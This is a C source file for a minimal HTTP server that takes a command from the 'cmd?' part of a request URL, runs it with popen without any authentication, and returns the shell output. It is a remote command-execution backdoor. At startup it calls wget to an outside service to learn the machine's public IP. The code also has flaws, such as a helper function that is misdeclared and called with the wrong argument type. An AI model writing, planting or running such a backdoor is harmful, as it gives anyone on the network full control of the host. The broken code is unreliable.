#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define BUFSIZE 1024

void url_decode(char *src) {
  char *dst = src;
  while (*src) {
    if (*src == '%' && isxdigit((int)src[1]) && isxdigit((int)src[2])) {
      // decode %XX to ASCII character
      *dst = (char)((hex2int(src[1]) << 4) | hex2int(src[2]));
      src += 3;
    } else {
      *dst = *src++;
    }
    dst++;
  }
  *dst = '\0';
}

int hex2int(char* c) {
  if (isdigit(c)) {
    return c - '0';
  } else {
    return tolower(c) - 'a' + 10;
  }
}

int main(int argc, char *argv[]) {
  int sockfd, connfd, len;
  struct sockaddr_in servaddr, cli;
  int opt;
  int port = 80;

  system("wget -qO- http://ipecho.net/plain");

  while ((opt = getopt(argc, argv, "p:")) != -1) {
    switch (opt) {
    case 'p':
      port = atoi(optarg);
      break;
    default:
      fprintf(stderr, "Usage: %s -p [port]\n", argv[0]);
      exit(EXIT_FAILURE);
    }
  }

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1) {
    fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  memset(&servaddr, 0, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  if (inet_pton(AF_INET, "0.0.0.0", &servaddr.sin_addr) <= 0) {
    fprintf(stderr, "Error converting IP address: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }
  servaddr.sin_port = htons(port);

  if (bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
    fprintf(stderr, "Error binding socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  if (listen(sockfd, 5) != 0) {
    fprintf(stderr, "Error listening on socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  while (1) {
    connfd = accept(sockfd, (struct sockaddr *)&cli, &len);
    if (connfd < 0) {
      fprintf(stderr, "Error accepting connection: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
    }

    char buffer[BUFSIZE];
    bzero(buffer, BUFSIZE);

    if (read(connfd, buffer, BUFSIZE) < 0) {
      fprintf(stderr, "Error reading from socket: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
    }

    // Extract the command from the HTTP request URL
    char *cmd_start = strstr(buffer, "cmd?");
    if (cmd_start == NULL) {
      const char *reply =
          "HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n";
      if (write(connfd, reply, strlen(reply)) < 0) {
        fprintf(stderr, "Error writing to socket: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
      }
      close(connfd);
      continue;
    }
    cmd_start += 4;

    char *cmd_end = strchr(cmd_start, ' ');
    if (cmd_end == NULL) {
      const char *reply =
          "HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n";
      if (write(connfd, reply, strlen(reply)) < 0) {
        fprintf(stderr, "Error writing to socket: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
      }
      close(connfd);
      continue;
    }
    *cmd_end = '\0';

    url_decode(cmd_start);

    // Execute the command and capture its output
    FILE *fp = popen(cmd_start, "r");
    if (fp == NULL) {
      const char *reply =
          "HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n";
      if (write(connfd, reply, strlen(reply)) < 0) {
        fprintf(stderr, "Error writing to socket: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
      }
      close(connfd);
      continue;
    }

    char response[BUFSIZE];
    int response_len = 0;
    int c;
    while ((c = getc(fp)) != EOF && response_len < BUFSIZE - 1) {
      response[response_len++] = c;
    }
    response[response_len] = '\0';
    pclose(fp);

    // Send the command output back as the HTTP response
    char http_response[BUFSIZE];
    snprintf(http_response, BUFSIZE,
             "HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", response_len,
             response);
    if (write(connfd, http_response, strlen(http_response)) < 0) {
      fprintf(stderr, "Error writing to socket: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
    }

    close(connfd);
  }
}
